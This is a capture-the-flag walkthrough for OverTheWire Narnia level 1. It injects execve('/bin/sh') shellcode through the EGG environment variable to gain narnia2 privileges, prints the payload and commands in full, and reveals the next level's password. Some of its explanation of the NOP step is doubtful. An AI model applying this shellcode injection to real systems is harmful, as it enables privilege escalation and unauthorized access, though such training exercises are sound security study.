Challenge URL is <a href="http://www.overthewire.org/wargames/narnia/narnia1.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 1

There is no information for this level.
If you would like to see the description of this level expanded, please consider to contribute to OTW!

CHALLENGE_CONTENT
	- The program is located at /narnia/narnia1
	- Disassembly shows that 'ret' variable is at $ESP+0x1c

		0x08048445 <+49>:	movl   $0x8048569,(%esp)
		0x0804844c <+56>:	call   0x8048340 <puts@plt>
		0x08048451 <+61>:	movl   $0x8048530,(%esp)
		0x08048458 <+68>:	call   0x8048320 <getenv@plt>
		0x0804845d <+73>:	mov    %eax,0x1c(%esp)		<<< ret = getenv("EGG")
	  * 0x08048461 <+77>:	mov    0x1c(%esp),%eax
		0x08048465 <+81>:	call   *%eax


	- We can upload a shell code with drop-privilledge(seteuid) by setting it in EGG, but we have to be careful to set first 4 bytes of the string to the address of shellcode.

	- When test with EGG=aaaa, 
		ret --> 0xffffd992, whereas $esp = 0xffffd720
		Meaning at location 0xffffd992 is where the string from getenv("EGG") resides. We have to point to that location + 4 (skip the pointing address) and put our shell code there.

	- For illustration:
		0xffffd992: (address for ret) (shellcode) 

	- Stack does grow as many characters is input. Therefore, we cannot rely only on the address. We need to try several times to get it right. (or use other advanced techniques)

	- Luckily, there is no other protection method. ESP is always the same address. Therefore we can pin-point the address very accurately

	- Shellcode with setreuid() from http://www.shell-storm.org/shellcode/files/shellcode-811.php (28bytes)
		"\x31\xc0\x50\x68\x2f\x2f\x73"
		"\x68\x68\x2f\x62\x69\x6e\x89"
		"\xe3\x89\xc1\x89\xc2\xb0\x0b"
		"\xcd\x80\x31\xc0\x40\xcd\x80

	- Our payload consists of address(4 bytes) + shellcode(28 bytes)= 32 bytes. The return address for ret is 0xffffd996 - size of payload. The location of memory after we inject shell code would be at 0xffffd996 - 38 = 0xffffd976
	So will have the pointer points to address 0xffffd976 +4 = 0xffffd97a

	- Then our payload is
		"\x7a\xd9\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

	- Problem is, $ebp is at 0xffffd728, it doesn't allows anything to be executed over this address. We have to put some junks so the 'ret' is higher than $ebp
		ret - $ebp = 0xffffd996 - 0xffffd728 = 622 , let me set it as 700 characters below the payload.
	- So now, our payload will be like: [ ret(4bytes) + shellcode(28bytes) + junk(700bytes) ] = total of 732 bytes
		the new return address would be : 0xffffd996 - 732 = 0xffffd6ba
		the new point of executing shellcode: 0xffffd6ba + 4 = 0xffffd6be
	- New shellcode is
		"\xbe\xd6\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*700

	- It is now does nothing, no error nor success message. Here is because of when it jumps to the starting of shellcode, it does not know that it is the begining of a function. It needs to jump to an empty NOP before it can start the shell code. Therefore, I need to put at least one NOP in front of the shellcode and recalculate the ret address to point to the NOP.
	- Now the shellcode is like this: [ ret(4bytes) + NOP(1byte)+ shellcode(28bytes) + junk(700bytes) ] = total of 733 bytes.

		"\xbf\xd6\xff\xff" + "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*700

	- remark: 'ret' address can be either 0xffffd6be(point to NOP), or 0xffffd6bf(point to shellcode), since NOP does nothing and move to next instruction.

	narnia1@melissa:/narnia$ export EGG=$(python -c 'print "\xbf\xd6\xff\xff"+"\x90"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*700')
	narnia1@melissa:/narnia$ ./narnia1 
	Trying to execute EGG!
	$ id
	uid=14001(narnia1) gid=14001(narnia1) euid=14002(narnia2) groups=14002(narnia2),14001(narnia1)
	$ cat /etc/narnia_pass/narnia2
	nairiepecu
	$ 
